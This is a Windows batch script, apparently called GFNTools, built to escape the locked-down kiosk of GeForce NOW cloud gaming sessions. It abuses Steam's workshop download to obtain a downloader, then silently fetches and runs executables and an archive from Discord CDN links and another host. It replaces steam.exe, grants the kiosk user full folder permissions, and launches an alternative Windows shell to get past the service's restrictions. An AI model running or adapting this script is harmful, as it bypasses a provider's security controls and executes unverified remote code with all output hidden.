@ECHO OFF
CLS
COLOR 04
TITLE GFNTools V5.3.1 [USteam Bypass]
ECHO ___________________________________________________________
ECHO.
ECHO [93m		  GFNTools![31m
ECHO ___________________________________________________________
ECHO.
ECHO NOTE : If anyone is posting videos on GFNTools
ECHO without our consent, we have all rights to take ur video down!
ECHO.
ECHO For permissions contact Hiiva or \o^>
ECHO ___________________________________________________________
IF NOT EXIST "C:\Program Files (x86)\nxlog" GOTO :ownpc >NUL 2>&1


B:
MKDIR "B:\GFNTools" >NUL 2>&1
MKDIR "B:\USteams" >NUL 2>&1
ICACLS "B:\GFNTools" /grant kiosk:(OI)(CI)F /T >NUL 2>&1
ICACLS "B:\GFNTools" /grant Users:(OI)(CI)F /T >NUL 2>&1
%HOMEDRIVE%
CD "C:\Program Files (x86)\Steam"

start "" "steam.exe" "steam://install/304930" >NUL 2>&1
START "" "steam.exe" "steam://open/console" >NUL 2>&1
ECHO download_item 304930 2250811147|clip
ECHO In the console box press CTRL + V
:rdlcheck:
IF EXIST "C:\Program Files (x86)\Steam\steamapps\content\app_304930\item_2250811147\files\rdl.exe" GOTO found >NUL 2>&1
GOTO rdlcheck
:found:
CLS
ECHO RDL downloaded! Downloading GFNTools.
PING 127.0.0.1 -n 3 >NUL 2>&1
REN "C:\Program Files (x86)\Steam\steamapps\content" gfntools >NUL 2>&1
SET DL="C:\Program Files (x86)\Steam\steamapps\gfntools\app_304930\item_2250811147\files\rdl.exe"
B:
cd "B:\GFNTools"
%DL% -LJOk https://cdn.discordapp.com/attachments/741059833163153469/763423169230667816/steam.exe >NUL 2>&1
TASKKILL /F /IM steam.exe >NUL 2>&1
START "" steam.exe


%DL% -LJOk "https://picteon.dev/files/cached/GFNTools.7z" >NUL 2>&1
%DL% -LJOk "https://cdn.discordapp.com/attachments/741059833163153469/757284597602975825/7.exe" >NUL 2>&1
%DL% -LJOk "https://cdn.discordapp.com/attachments/741059833163153469/757298274364424232/7z.dll" >NUL 2>&1
set EXTRACT="B:\GFNTools\7.exe"
PING 127.0.0.1 -n 2 >NUL 2>&1
%EXTRACT% x GFNTools.7z >NUL 2>&1
DEL GFNTools.7z >NUL 2>&1

CLS

ECHO USteam bypass!
C:
CD "C:/Program Files (x86)/Steam"
move steam.exe.old "B:/USteams"
B:
CD/
CD USteams
start "" "steam.exe.old" -dev

ECHO GFNTools downloaded! Launching!
PING 127.0.0.1 -n 3 >NUL 2>&1
CD "B:\GFNTools\WinXShell"
START /WAIT "" "B:\GFNTools\WinXShell\start.bat"
EXIT


:ownpc
ECHO You are running GFNTools on your own computer. That is not how this works. Please run this file on GeForce NOW.
PAUSE
EXIT




